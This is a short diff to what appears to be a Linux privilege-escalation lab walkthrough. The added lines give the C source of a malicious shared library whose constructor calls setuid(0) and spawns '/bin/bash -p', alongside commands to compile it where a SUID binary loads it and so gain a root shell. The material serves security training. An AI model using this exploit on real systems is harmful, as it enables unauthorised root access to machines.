@@ -22,5 +22,15 @@ Example shared object code can be found at /home/user/tools/suid/libcalc.c. It s
 at the location the suid-so executable was looking for it:
 > gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
 
+CODE in libcalc.c -
+
+#include <stdio.h>
+#include <stdlib.h>
+static void inject() __attribute__((constructor));
+void inject() {
+	setuid(0);
+	system("/bin/bash -p");
+}
+
 Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
 > /usr/local/bin/suid-so
